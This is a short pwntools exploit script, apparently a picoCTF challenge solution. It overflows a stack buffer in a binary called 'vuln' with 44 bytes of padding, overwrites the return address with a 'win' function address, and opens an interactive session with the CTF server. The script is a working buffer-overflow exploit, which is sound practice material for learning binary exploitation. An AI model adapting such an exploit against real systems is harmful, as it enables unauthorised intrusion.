from pwn import *

p = process("./vuln")
p = remote('saturn.picoctf.net', 54842)
#context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(p, gdbscript='''
 #          b *main
  #         c
   #        ''')

buffer = b"A" * 44
win = p32(0x080491f6)

pay = buffer
pay += win
pay += b"B" * 4
p.sendlineafter(b":",  pay)
p.interactive()
